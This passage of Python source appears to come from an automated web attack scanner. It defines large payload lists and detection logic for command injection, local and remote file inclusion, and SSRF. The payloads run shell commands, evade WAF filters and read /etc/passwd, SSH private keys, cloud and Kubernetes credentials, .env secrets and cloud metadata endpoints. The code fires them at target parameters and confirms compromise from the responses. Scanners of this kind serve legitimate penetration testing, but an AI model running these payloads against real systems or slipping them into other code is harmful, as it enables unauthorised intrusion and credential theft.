            PayloadItem(";IFS=,;cat,/etc/passwd",  "Unix - IFS Comma",       "Replace IFS with comma to use as space separator"),
            PayloadItem("|bas''e64 /etc/passwd",   "Unix - B64 Exfil",       "Base64 encode /etc/passwd for clean exfiltration"),
            PayloadItem(";python3 -c 'import os;os.system(\"id\")'",
                        "Python RCE",              "Spawn shell via Python3 interpreter"),
            PayloadItem(";perl -e 'system(\"id\")'",
                        "Perl RCE",                "Spawn shell via Perl interpreter"),
            PayloadItem(";ruby -e 'exec(\"id\")'",
                        "Ruby RCE",                "Spawn shell via Ruby interpreter"),
            PayloadItem(";node -e 'require(\"child_process\").exec(\"id\",function(e,s){console.log(s)})'",
                        "Node.js RCE",             "Execute shell command via Node.js"),
            PayloadItem(";curl http://127.0.0.1/",
                        "Unix - SSRF via RCE",     "Confirm RCE by making internal HTTP request"),
            PayloadItem(";wget -q -O- http://127.0.0.1/",
                        "Unix - wget SSRF",        "Confirm RCE + internal SSRF via wget"),
            # ── Windows PowerShell ────────────────────────────────────────────
            PayloadItem("& powershell -c whoami",  "PowerShell whoami",      "Execute via PowerShell — confirms PS availability"),
            PayloadItem("& powershell -enc dwBoAG8AYQBtAGkA",
                        "PowerShell Base64",       "Base64-encoded 'whoami' — bypasses keyword filters"),
            PayloadItem("& cmd /c \"ping 127.0.0.1 -n 5\"",
                        "Windows time-based",      "Time delay via ping on Windows — RCE confirmation"),
        
            # ── Extended blind timing ────────────────────────────────────────
            PayloadItem("; sleep 10",          "Blind sleep 10s",   "10s sleep for blind RCE confirm"),
            PayloadItem("| sleep 10",          "Pipe sleep 10s",    "Pipe sleep — blind detection"),
            PayloadItem("$(sleep 10)",         "Subshell sleep",    "Bash subshell sleep bypass"),
            PayloadItem("`sleep 10`",          "Backtick sleep",    "Backtick sleep injection"),
            PayloadItem("; /bin/sleep 10",     "Abs sleep",         "Absolute path bypasses PATH filter"),
            PayloadItem("& timeout /t 10",     "Win timeout",       "Windows blind RCE via timeout"),
            # ── WAF evasion ───────────────────────────────────────────────────
            PayloadItem(";${IFS}id",           "IFS sep",           "IFS as space bypass"),
            PayloadItem(";$IFS$9id",           "IFS$9",             "IFS field separator variant"),
            PayloadItem(";/???/id",            "Glob id",           "Glob finds id binary"),
            PayloadItem(";/???/bin/??/id",     "Deep glob",         "Deep glob path filter bypass"),
            PayloadItem(";{id}",               "Brace group",       "Brace grouping execution"),
            PayloadItem(";id<>/dev/null",      "Redirect null",     "Redirect nulls stderr"),
            # ── Node.js ───────────────────────────────────────────────────────
            PayloadItem("require('child_process').execSync('id').toString()",
                        "Node execSync",       "Node.js child_process"),
            # ── Python ────────────────────────────────────────────────────────
            PayloadItem("__import__('os').popen('id').read()",
                        "Python popen",        "Python os.popen RCE"),
            # ── Java ──────────────────────────────────────────────────────────
            PayloadItem("@java.lang.Runtime@getRuntime().exec('id')",
                        "Java OGNL",           "OGNL expression RCE"),
            PayloadItem("T(java.lang.Runtime).getRuntime().exec('id')",
                        "SpEL exec",           "Spring SpEL RCE"),
            # ── Perl / Ruby ───────────────────────────────────────────────────
            PayloadItem("; perl -e 'print `id`'",
                        "Perl exec",           "Perl backtick RCE"),
            PayloadItem("; ruby -e 'puts `id`'",
                        "Ruby exec",           "Ruby backtick RCE"),
]

        self.rce_patterns_high = [
            # id command full output: uid=33(www-data) gid=33(www-data)
            r"uid=\d+\(\w[\w-]*\)\s+gid=\d+\(\w[\w-]*\)",
            # /etc/passwd lines
            r"root:x:0:0:",
            r"daemon:x:\d+:\d+:",
            r"www-data:x:\d+:\d+:",
            # Windows command output
            r"windows\s+ip\s+configuration",
            r"volume in drive [A-Z]",
            r"directory of [A-Z]:\\",
            r"\[extensions\]\s*\r?\n.*?mci",   # win.ini content
            # uname -a output
            r"linux\s+\S+\s+\d+\.\d+\.\d+\S*\s+#\d+",
            # PowerShell whoami output patterns
            r"(nt authority\\system|nt authority\\network service|\\\w+\\\w+)",
            # Python/Perl/Ruby exec proof
            r"^[a-z][-a-z0-9]*\s*$",           # clean whoami output (single word)
        ]

        self.rce_patterns_medium = [
            # whoami output — just a username (www-data, apache, nginx, root, etc.)
            r"^(www-data|apache|nginx|nobody|root|Administrator|SYSTEM|network service)$",
            r"\bwww-data\b",
            r"\bapache\b",
            # PATH/ENV vars from printenv
            r"PATH=/usr/local/sbin:/usr/local/bin",
            r"HOME=/root\b",
            r"HOME=/var/www\b",
            r"HOME=/home/\w+\b",
            r"SHELL=/bin/bash\b",
            r"SHELL=/bin/sh\b",
            # /bin paths from cat commands
            r"/bin/bash",
            r"/bin/sh",
            # shell error format
            r"sh:\s+\d+:\s+\w+:\s+not found",
        ]

        # Marker patterns — deterministic proof via echo command
        self.rce_marker = "vulnerable_y2s"

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            if not params:
                return vulnerabilities

            for param_name in list(params.keys())[:self.config.max_params_test]:
                result = await self._test_parameter(client, url, param_name, params)
                vulnerabilities.extend(result)

        except Exception:
            pass

        return vulnerabilities

    async def _test_parameter(
        self,
        client: httpx.AsyncClient,
        url: str,
        param_name: str,
        all_params: Dict
    ) -> List[VulnerabilityResult]:
        vulnerabilities = []
        try:
            # ── Baseline: fetch twice and average for reliable timing ──────────
            try:
                _bt0 = time.monotonic()
                baseline_resp = await client.get(
                    url, timeout=self.config.vuln_timeout,
                    follow_redirects=self.config.follow_redirects
                )
                _bt1 = time.monotonic() - _bt0
                baseline_text = baseline_resp.text

                # Second baseline sample for time-based reliability
                _bt2_0 = time.monotonic()
                await client.get(url, timeout=self.config.vuln_timeout,
                                 follow_redirects=self.config.follow_redirects)
                _bt2 = time.monotonic() - _bt2_0
                baseline_time = (_bt1 + _bt2) / 2

            except Exception:
                return vulnerabilities

            parsed = urllib.parse.urlparse(url)
            original_val = all_params[param_name][0] if all_params[param_name] else ""

            # ── Unique random marker for this scan session ────────────────────
            rnd = hashlib.md5(f"{url}{param_name}{time.time()}".encode()).hexdigest()[:8]
            unique_marker = f"y2s_{rnd}"

            for item in self.rce_payloads:
                payload = item.payload
                _is_sleep = "sleep" in payload.lower() or "ping" in payload.lower()

                # Replace static marker in echo payloads with unique one
                effective_payload = payload.replace("vulnerable_y2s", unique_marker)

                candidates = [effective_payload]
                if original_val:
                    candidates.append(original_val + effective_payload)

                for injected in candidates:
                    try:
                        test_params = all_params.copy()
                        test_params[param_name] = [injected]
                        test_query = urllib.parse.urlencode(test_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, test_query, parsed.fragment
                        ))

                        _rt0 = time.monotonic()
                        resp = await client.get(
                            test_url, timeout=self.config.vuln_timeout,
                            follow_redirects=self.config.follow_redirects
                        )
                        elapsed = time.monotonic() - _rt0
                        content = resp.text

                        # ── High-confidence output patterns ────────────────────
                        for pattern in self.rce_patterns_high:
                            if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                                if not re.search(pattern, baseline_text, re.IGNORECASE | re.MULTILINE):
                                    # ── FP reduction: verify with a second request ──
                                    try:
                                        resp2 = await client.get(test_url, timeout=self.config.vuln_timeout,
                                                                  follow_redirects=self.config.follow_redirects)
                                        if re.search(pattern, resp2.text, re.IGNORECASE | re.MULTILINE):
                                            vulnerabilities.append(VulnerabilityResult(
                                                url=url,
                                                vulnerability_type=VulnerabilityType.RCE,
                                                severity="CRITICAL",
                                                vulnerable_params=[param_name],
                                                payload_used=injected,
                                                evidence=f"Command output confirmed on 2 consecutive requests — absent from baseline",
                                                details=f"RCE confirmed in parameter '{param_name}'",
                                                subtype=item.subtype,
                                                impact=item.impact,
                                            ))
                                            return vulnerabilities
                                    except Exception:
                                        pass

                        # ── Medium patterns (1 consistent hit = enough) ────────
                        for pattern in self.rce_patterns_medium:
                            if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                                if not re.search(pattern, baseline_text, re.IGNORECASE | re.MULTILINE):
                                    # Verify on second request too
                                    try:
                                        resp2 = await client.get(test_url, timeout=self.config.vuln_timeout,
                                                                  follow_redirects=self.config.follow_redirects)
                                        if re.search(pattern, resp2.text, re.IGNORECASE | re.MULTILINE):
                                            vulnerabilities.append(VulnerabilityResult(
                                                url=url,
                                                vulnerability_type=VulnerabilityType.RCE,
                                                severity="HIGH",
                                                vulnerable_params=[param_name],
                                                payload_used=injected,
                                                evidence=f"Pattern '{pattern}' confirmed on 2 requests — absent from baseline",
                                                details=f"Probable RCE in parameter '{param_name}' — manual verification recommended",
                                                subtype=item.subtype,
                                                impact=item.impact,
                                            ))
                                            return vulnerabilities
                                    except Exception:
                                        pass

                        # ── Unique echo marker ─────────────────────────────────
                        if unique_marker in content and unique_marker not in baseline_text:
                            vulnerabilities.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.RCE,
                                severity="CRITICAL",
                                vulnerable_params=[param_name],
                                payload_used=injected,
                                evidence=f"Unique marker '{unique_marker}' appeared in response — execution confirmed",
                                details=f"RCE confirmed via echo marker in parameter '{param_name}'",
                                subtype=item.subtype,
                                impact=item.impact,
                            ))
                            return vulnerabilities

                    except asyncio.TimeoutError:
                        elapsed = time.monotonic() - _rt0
                        if _is_sleep and elapsed >= 2.5:
                            # ── Time-based FP reduction: repeat with a non-sleep payload ──
                            # If the server is just slow, a quick probe will also be slow
                            try:
                                _probe_t0 = time.monotonic()
                                await client.get(url, timeout=self.config.vuln_timeout,
                                                 follow_redirects=self.config.follow_redirects)
                                probe_time = time.monotonic() - _probe_t0
                                # Real delay: probe is fast, sleep was slow
                                if elapsed > probe_time * 3 and elapsed > baseline_time * 2.5:
                                    vulnerabilities.append(VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.RCE,
                                        severity="CRITICAL",
                                        vulnerable_params=[param_name],
                                        payload_used=injected,
                                        evidence=(
                                            f"Timeout {elapsed:.1f}s vs probe {probe_time:.2f}s "
                                            f"vs baseline {baseline_time:.2f}s — time-based RCE confirmed"
                                        ),
                                        details=f"Time-based RCE in parameter '{param_name}'",
                                        subtype=item.subtype,
                                        impact=item.impact,
                                    ))
                                    return vulnerabilities
                            except Exception:
                                pass
                    except Exception:
                        continue

        except Exception:
            pass

        return vulnerabilities


class LFIScanner:
    def __init__(self, config):
        self.config = config
        self.payloads = [
            PayloadItem("../../../../etc/passwd",          "Path Traversal",        "Read /etc/passwd — exposes server user accounts"),
            PayloadItem("../../../etc/passwd",             "Path Traversal",        "Read /etc/passwd with 3-level traversal"),
            PayloadItem("../../etc/passwd",                "Path Traversal",        "Read /etc/passwd with 2-level traversal"),
            PayloadItem("....//....//....//etc/passwd",    "Double Slash Bypass",   "Bypass basic ../ filters using double slash"),
            PayloadItem("..%2F..%2F..%2Fetc%2Fpasswd",    "URL Encoded",           "Bypass filters using URL encoding"),
            PayloadItem("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Double URL Encoded",    "Bypass filters using double URL encoding"),
            PayloadItem(r"..../\..../\etc/passwd",              "Mixed Slash",           "Bypass filters using mixed slashes"),
            PayloadItem("/etc/passwd",                     "Absolute Path",         "Direct absolute path inclusion"),
            PayloadItem("php://filter/convert.base64-encode/resource=index.php", "PHP Wrapper", "Read PHP source code via php:// wrapper — exposes application logic"),
            PayloadItem("php://filter/read=string.rot13/resource=index.php",     "PHP Wrapper", "Read PHP source using ROT13 encoding"),
            PayloadItem("php://input",                     "PHP Input Wrapper",     "Execute arbitrary PHP code via php://input"),
            PayloadItem("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "Data URI", "Execute PHP code via data:// wrapper"),
            PayloadItem("../../../../etc/shadow",          "Sensitive File",        "Read /etc/shadow — exposes hashed passwords"),
            PayloadItem("../../../../etc/hosts",           "Sensitive File",        "Read /etc/hosts — exposes network configuration"),
            PayloadItem("../../../../proc/self/environ",   "Process Environ",       "Read process environment — may contain secrets"),
            PayloadItem("../../../../windows/win.ini",     "Windows - win.ini",     "Read Windows configuration file — confirms Windows server"),
            PayloadItem("../../../../windows/system32/drivers/etc/hosts", "Windows - hosts", "Read Windows hosts file"),
            PayloadItem("..\\..\\..\\windows\\win.ini",    "Windows Backslash",     "Windows path traversal with backslashes"),
            PayloadItem("../../../../var/log/apache2/access.log", "Log Poisoning",  "Read Apache access log — potential for log poisoning RCE"),
            PayloadItem("../../../../var/log/nginx/access.log",   "Log Poisoning",  "Read Nginx access log"),

            # ── More traversal depths ─────────────────────────────────────────
            PayloadItem("../../../../../etc/passwd",         "Path Traversal 5", "5-level traversal"),
            PayloadItem("../../../../../../etc/passwd",      "Path Traversal 6", "6-level traversal"),
            PayloadItem("../../../../../../../etc/passwd",   "Path Traversal 7", "7-level traversal"),
            PayloadItem("../../../../../../../../etc/passwd","Path Traversal 8", "8-level traversal"),

            # ── More filter bypasses ──────────────────────────────────────────
            PayloadItem("..%252f..%252f..%252fetc%252fpasswd",     "Double URL Encoded 2", "Double-encode each slash"),
            PayloadItem("%2e%2e/%2e%2e/%2e%2e/etc/passwd",         "Mixed Encoded",         "Encoded dots, plain slashes"),
            PayloadItem(r"..../..../..../etc/passwd",            "Backslash Mix",          "Mixed backslash filter bypass"),
            PayloadItem("..%c0%af..%c0%afetc/passwd",             "UTF-8 Overlong",         "Overlong UTF-8 encoded slash"),
            PayloadItem("..%ef%bc%8f..%ef%bc%8fetc/passwd",       "Fullwidth Slash",        "Fullwidth slash bypass"),
            PayloadItem("..%5c..%5c..%5cetc%5cpasswd",            "Backslash URL Encoded",  "URL-encoded backslash traversal"),
            PayloadItem("/proc/self/fd/0",                        "Proc FD",               "Read stdin via /proc/self/fd"),
            PayloadItem("../../../../proc/self/cmdline",          "Proc Cmdline",           "Read process command line args"),

            # ── More Windows paths ────────────────────────────────────────────
            PayloadItem("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Win Hosts BS","Windows hosts via backslash"),
            PayloadItem("../../../../boot.ini",              "Windows boot.ini",  "Read Windows boot configuration"),
            PayloadItem("..%5c..%5cwindows%5cwin.ini",       "Win ini Encoded",   "Encoded Windows path"),
            PayloadItem("/windows/win.ini",                  "Win ini Absolute",  "Absolute Windows path"),

            # ── PHP wrappers ──────────────────────────────────────────────────
            PayloadItem("php://filter/convert.base64-encode/resource=config.php",  "PHP Wrapper", "Read config.php source"),
            PayloadItem("php://filter/convert.base64-encode/resource=../config.php","PHP Wrapper", "Read parent config.php"),
            PayloadItem("php://filter/convert.base64-encode/resource=../../config", "PHP Wrapper", "Read config without ext"),
            PayloadItem("expect://id",                        "PHP Expect",        "RCE via expect:// wrapper"),

            # ── Null byte bypasses ────────────────────────────────────────
            PayloadItem("../../../../etc/passwd%00",              "Null Byte",         "Bypass extension filter via null byte termination"),
            PayloadItem("../../../../etc/passwd%00.jpg",          "Null Byte + Ext",   "Bypass .jpg whitelist check — null byte stops parsing"),
            PayloadItem("../../../../etc/passwd%00.php",          "Null Byte + PHP",   "Bypass .php whitelist via null byte"),
            PayloadItem("../../../../etc/passwd%2500",            "Double Encoded Null","Double-URL-encoded null byte"),
            PayloadItem("php://filter/convert.base64-encode/resource=../../../../etc/passwd%00", "PHP Wrapper Null", "PHP wrapper with null byte"),

            # ── Java / JSP / Spring paths ─────────────────────────────────────
            PayloadItem("../../../../WEB-INF/web.xml",          "Java WEB-INF",      "Read Java web.xml — exposes servlet config and credentials"),
            PayloadItem("../../../../WEB-INF/classes/application.properties",
                        "Spring Boot Props", "Read Spring Boot properties — may contain DB URL and passwords"),
            PayloadItem("../../../../META-INF/context.xml",     "Java META-INF",     "Tomcat context.xml — DB credentials often stored here"),
            PayloadItem("..\\..\\WEB-INF\\web.xml",             "Java WEB-INF Win",  "Windows path to WEB-INF/web.xml"),
            # ── ASP.NET ───────────────────────────────────────────────────────
            PayloadItem("../../../../web.config",               "ASP.NET web.config","Read web.config — connection strings, API keys"),
            PayloadItem("..\\..\\web.config",                   "web.config Win",    "Windows path to web.config"),
            PayloadItem("../../../../App_Data/database.mdb",    "ASP.NET DB",        "Access Application database"),
            # ── Docker / Cloud ────────────────────────────────────────────────
            PayloadItem("../../../../proc/1/cmdline",           "Docker /proc",      "Read PID 1 cmdline — reveals container entry point"),
            PayloadItem("../../../../proc/1/environ",           "Docker environ",    "Read container environment — may contain API keys or secrets"),
            PayloadItem("../../../../run/secrets/kubernetes.io/serviceaccount/token",
                        "K8s Service Token", "Kubernetes service account token — grants cluster API access"),
            PayloadItem("../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
                        "K8s Token Alt",     "Alternative K8s token path"),
            PayloadItem("../../../../home/user/.ssh/id_rsa",    "SSH Private Key",   "Read SSH private key — direct server access"),
            PayloadItem("../../../../root/.ssh/id_rsa",         "Root SSH Key",      "Root SSH private key — full server compromise"),
            PayloadItem("../../../../etc/kubernetes/admin.conf", "K8s Admin Conf",   "Kubernetes admin kubeconfig — full cluster control"),
        
            # ── Log poisoning targets ──────────────────────────────────────────
            PayloadItem("../../../../var/log/auth.log",           "Auth Log",         "Read auth.log — may enable log poisoning"),
            PayloadItem("../../../../var/log/syslog",             "Syslog",           "Read system log — may contain injected data"),
            PayloadItem("../../../../var/log/mail.log",           "Mail Log",         "Read mail log — poisonable via email headers"),
            PayloadItem("../../../../proc/net/tcp",               "Proc Net TCP",     "Read active TCP connections from /proc"),
            PayloadItem("../../../../proc/net/fib_trie",          "Proc Net FIB",     "Internal network routes — useful for pivoting"),
            # ── Cloud credential files ─────────────────────────────────────────
            PayloadItem("../../../../home/ubuntu/.aws/credentials","AWS Creds",       "Read AWS credentials — cloud account takeover"),
            PayloadItem("../../../../root/.aws/credentials",       "AWS Root Creds",  "Root AWS credentials"),
            PayloadItem("../../../../home/ubuntu/.gcp/credentials.json","GCP Creds",  "GCP service account credentials"),
            PayloadItem("../../../../etc/cron.d/cron",             "Cron Jobs",       "Read scheduled tasks — reveals server functionality"),
            PayloadItem("../../../../etc/crontab",                 "Crontab",         "System crontab"),
            # ── Flask / Python app files ──────────────────────────────────────
            PayloadItem("../../../../app/config.py",              "Flask Config",     "Flask application config — may contain secret key"),
            PayloadItem("../../../../app/settings.py",            "Django Settings",  "Django settings — contains SECRET_KEY and DB creds"),
            PayloadItem("../../../../.env",                        "Dotenv File",      "Environment file — API keys, tokens, passwords"),
            PayloadItem("../../../../.env.local",                  "Dotenv Local",     "Local overrides to environment file"),
            PayloadItem("../../../../.env.production",             "Dotenv Prod",      "Production environment secrets"),
            # ── Ruby on Rails ─────────────────────────────────────────────────
            PayloadItem("../../../../config/database.yml",         "Rails DB Config",  "Rails DB credentials — username, password, host"),
            PayloadItem("../../../../config/secrets.yml",          "Rails Secrets",    "Rails secret_key_base — session forgery"),
            PayloadItem("../../../../config/master.key",           "Rails Master Key", "Rails master key — decrypts all credentials"),
            # ── Node.js ───────────────────────────────────────────────────────
            PayloadItem("../../../../package.json",                "Node package.json","Exposes dependencies and project metadata"),
            PayloadItem("../../../../.npmrc",                      "NPM RC",           "NPM registry token — may allow package hijacking"),
        ]
        self.signatures = [
            # /etc/passwd lines — extremely specific
            r"root:x:0:0:",
            r"root:\*:0:0:",
            r"daemon:x:\d+:\d+:",
            r"www-data:x:\d+:\d+:",
            r"bin:x:\d+:\d+:",
            r"nobody:x:\d+:\d+:",
            # Windows ini files
            r"\[extensions\]\s*\r?\n",
            r"\[fonts\]\s*\r?\n",
            r"for 16-bit app support",
            r"\[boot loader\]",
            r"timeout=\d+\s*\r?\ndefault=",  # boot.ini
            # proc/environ
            r"DOCUMENT_ROOT=/",              # Full path, not just word
            r"HTTP_USER_AGENT=Mozilla",      # Specific content
            r"PHP_SELF=/",
            r"SCRIPT_FILENAME=/",
            # base64 PHP source (php://filter output)
            r"^[A-Za-z0-9+/]{100,}={0,2}$", # Long base64 block
            # Java/JSP
            r"<web-app[^>]*>",               # web.xml root element
            r"<servlet-class>",              # web.xml servlet definition
            r"<Context[^>]*docBase",         # Tomcat context.xml
            r"connectionString=.*[Pp]assword",# web.config DB connection
            r"<connectionStrings>",          # ASP.NET web.config
            # Spring Boot
            r"spring\.datasource\.(url|password|username)",
            r"spring\.security\.(user\.password|oauth)",
            # SSH / Keys
            r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----",
            # Kubernetes
            r"eyJhbGciOiJ",                  # JWT token (k8s service account)
            r"kubernetes\.io/serviceaccount",
            # Docker / proc
            r"PATH=/usr/local/sbin.*HOSTNAME=",# container environ pattern
        ]

    async def scan_url(self, client, url):
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            file_params = {k: v for k, v in params.items()
                          if any(w in k.lower() for w in ['file','page','path','include','doc','template','load','read','view','lang','locale','module'])}
            all_params = {**file_params, **params} if file_params else params
            if not all_params:
                return vulns

            for param in list(all_params.keys())[:self.config.max_params_test]:
                try:
                    baseline = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
                    baseline_text = baseline.text
                except Exception:
                    continue

                for item in self.payloads:
                    try:
                        tp = params.copy()
                        tp[param] = [item.payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, tq, parsed.fragment))
                        resp = await client.get(tu, timeout=self.config.vuln_timeout, follow_redirects=True)
                        body = resp.text

                        for sig in self.signatures:
                            if re.search(sig, body, re.IGNORECASE) and not re.search(sig, baseline_text, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url, vulnerability_type=VulnerabilityType.LFI,
                                    severity="CRITICAL", vulnerable_params=[param],
                                    payload_used=item.payload,
                                    evidence=f"File content signature detected: '{sig}'",
                                    details=f"LFI confirmed in parameter '{param}'",
                                    subtype=item.subtype, impact=item.impact,
                                ))
                                return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns


class RFIScanner:
    def __init__(self, config):
        self.config = config
        self.test_urls = [
            "http://127.0.0.1/",
            "https://example.com/",
            "http://169.254.169.254/",
        ]
        self.payloads = [
            PayloadItem("http://127.0.0.1/rfi_test",               "HTTP Include",       "Include remote file via HTTP — enables remote code execution"),
            PayloadItem("https://127.0.0.1/rfi_test",              "HTTPS Include",      "Include remote file via HTTPS"),
            PayloadItem("//127.0.0.1/rfi_test",                    "Protocol-relative",  "Protocol-relative URL bypass"),
            PayloadItem("php://input",                             "PHP Input",          "Execute arbitrary code via php://input"),
            PayloadItem("data://text/plain,<?php system('id');?>",  "Data URI",           "Execute PHP code via data:// URI"),
            PayloadItem("expect://id",                             "Expect Wrapper",     "Execute OS command via expect:// wrapper"),
            PayloadItem("http://169.254.169.254/latest/meta-data/","SSRF/RFI Cloud",     "Access AWS metadata — exposes instance credentials"),

            # ── More protocol wrappers ────────────────────────────────────────
            PayloadItem("data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==", "Data URI whoami", "Execute whoami via data:// URI"),
            PayloadItem("phar://./test.jpg/shell.php",          "PHAR Wrapper",      "PHAR deserialization code execution"),
            PayloadItem("zip://./test.zip#shell.php",           "ZIP Wrapper",       "ZIP stream wrapper inclusion"),
            PayloadItem("compress.zlib://http://127.0.0.1/",   "Compress Wrapper",  "zlib compression wrapper SSRF"),

            # ── Protocol-relative and encoding bypasses ───────────────────────
            PayloadItem("\\\\127.0.0.1\\share\\test",           "UNC Path",          "Windows UNC path for SSRF/RFI"),
            PayloadItem("http://0x7f000001/rfi_test",           "Hex IP",            "Hex-encoded localhost IP"),
            PayloadItem("http://2130706433/rfi_test",           "Integer IP",        "Integer representation of 127.0.0.1"),
            PayloadItem("http://127.1/rfi_test",                "Short IP",          "Short form of 127.0.0.1"),
            PayloadItem("http://[::ffff:127.0.0.1]/rfi_test",   "IPv6 Mapped",       "IPv4-mapped IPv6 localhost bypass"),
        ]

    async def scan_url(self, client, url):
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            rfi_params = {k: v for k, v in params.items()
                         if any(w in k.lower() for w in ['url','file','path','include','src','source','load','remote','fetch','get'])}
            target_params = rfi_params if rfi_params else params
            if not target_params:
                return vulns

            for param in list(target_params.keys())[:self.config.max_params_test]:
                try:
                    baseline = await client.get(url, timeout=self.config.vuln_timeout, follow_redirects=True)
                    baseline_len = len(baseline.text)
                except Exception:
                    continue

                for item in self.payloads:
                    try:
                        tp = params.copy()
                        tp[param] = [item.payload]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, tq, parsed.fragment))
                        resp = await client.get(tu, timeout=self.config.vuln_timeout, follow_redirects=True)
                        body = resp.text

                        rfi_signs = [r"uid=\d+\(", r"root:x:0:0:", r"ami-id", r"instance-id", r"PHP Warning.*include"]
                        for sign in rfi_signs:
                            if re.search(sign, body, re.IGNORECASE) and not re.search(sign, baseline.text, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url, vulnerability_type=VulnerabilityType.RFI,
                                    severity="CRITICAL", vulnerable_params=[param],
                                    payload_used=item.payload,
                                    evidence=f"Remote file inclusion confirmed — response contains: '{sign}'",
                                    details=f"RFI in parameter '{param}'",
                                    subtype=item.subtype, impact=item.impact,
                                ))
                                return vulns
                    except Exception:
                        continue
        except Exception:
            pass
        return vulns


class SSRFScanner:
    def __init__(self, config):
        self.config = config
        self.payloads = [
            PayloadItem("http://169.254.169.254/latest/meta-data/",             "AWS Metadata",       "Access AWS instance metadata — exposes IAM credentials and instance info"),
            PayloadItem("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Creds", "Directly target AWS IAM credentials"),
            PayloadItem("http://metadata.google.internal/computeMetadata/v1/",  "GCP Metadata",       "Access Google Cloud metadata — exposes service account tokens"),
            PayloadItem("http://169.254.169.254/metadata/instance",             "Azure Metadata",     "Access Azure instance metadata"),
            PayloadItem("http://127.0.0.1/",                                   "Localhost",          "Access internal localhost — bypass firewall to reach internal services"),
            PayloadItem("http://127.0.0.1:8080/",                              "Internal Port 8080", "Access internal service on port 8080"),
            PayloadItem("http://127.0.0.1:8443/",                              "Internal Port 8443", "Access internal HTTPS service"),
            PayloadItem("http://127.0.0.1:6379/",                              "Redis",              "Access internal Redis — may allow data theft or command injection"),
            PayloadItem("http://127.0.0.1:9200/",                              "Elasticsearch",      "Access internal Elasticsearch — exposes all indexed data"),
            PayloadItem("http://127.0.0.1:27017/",                             "MongoDB",            "Access internal MongoDB"),
            PayloadItem("http://10.0.0.1/",                                    "Internal Network",   "Scan internal 10.x.x.x network"),
            PayloadItem("http://192.168.1.1/",                                 "Internal Router",    "Access internal router — exposes network configuration"),
            PayloadItem("http://0.0.0.0/",                                     "Null IP",            "Bypass localhost filters using 0.0.0.0"),
            PayloadItem("http://[::1]/",                                       "IPv6 Localhost",     "Bypass filters using IPv6 localhost"),
            PayloadItem("http://localhost/",                                   "Localhost String",   "Access localhost via hostname"),
            PayloadItem("dict://127.0.0.1:6379/info",                          "Redis DICT",         "Interact with Redis using DICT protocol"),
            PayloadItem("file:///etc/passwd",                                  "File Protocol",      "Read local files via file:// protocol"),
            PayloadItem("gopher://127.0.0.1:6379/_INFO",                       "Gopher Redis",       "Send arbitrary data to Redis via Gopher protocol"),

            # ── More cloud metadata ───────────────────────────────────────────
            PayloadItem("http://169.254.169.254/latest/user-data",              "AWS User Data",      "AWS user-data — may contain scripts with credentials"),
            PayloadItem("http://169.254.169.254/latest/meta-data/hostname",     "AWS Hostname",       "AWS hostname metadata"),
            PayloadItem("http://169.254.169.254/latest/meta-data/public-keys/", "AWS Public Keys",    "AWS SSH public keys"),
            PayloadItem("http://100.100.100.200/latest/meta-data/",            "Alibaba Cloud",      "Alibaba Cloud ECS metadata"),
            PayloadItem("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "GCP Token",          "GCP service account access token"),
            PayloadItem("http://169.254.169.254/metadata/instance?api-version=2021-01-01",
                        "Azure IMDS",         "Azure Instance Metadata Service v2"),

            # ── IP obfuscation to bypass SSRF filters ─────────────────────────
            PayloadItem("http://0x7f000001/",              "Hex localhost",     "Hex-encoded 127.0.0.1"),
            PayloadItem("http://2130706433/",              "Integer localhost",  "Integer form of 127.0.0.1"),
            PayloadItem("http://127.1/",                   "Short localhost",   "Short form of loopback"),
            PayloadItem("http://[::ffff:127.0.0.1]/",      "IPv6-mapped IPv4",  "IPv4-mapped IPv6 loopback"),
            PayloadItem("http://[::1]/",                   "IPv6 loopback",     "Pure IPv6 loopback"),
            PayloadItem("http://localhost:80/",            "Localhost port 80", "Explicit port on localhost"),
            PayloadItem("http://localhost:443/",           "Localhost HTTPS",   "HTTPS port on localhost"),
            PayloadItem("http://169.254.0.0/",             "Link-local scan",   "Link-local range probe"),

            # ── Internal services ─────────────────────────────────────────────
            PayloadItem("http://127.0.0.1:5000/",          "Flask/Dev port",    "Common Flask dev server port"),
            PayloadItem("http://127.0.0.1:8888/",          "Jupyter Notebook",  "Jupyter Notebook port"),
            PayloadItem("http://127.0.0.1:4000/",          "Dev port 4000",     "Common dev server port"),
            PayloadItem("http://127.0.0.1:3000/",          "Node/Grafana",      "Node.js or Grafana"),
            PayloadItem("http://127.0.0.1:2375/",          "Docker API",        "Docker remote API — full container control"),
            PayloadItem("http://127.0.0.1:11211/",         "Memcached",         "Memcached — cache poisoning possible"),
        
            # ── Protocol smuggling ────────────────────────────────────────────
            PayloadItem("gopher://127.0.0.1:9200/_",          "Gopher Elastic",    "Interact with Elasticsearch via Gopher"),
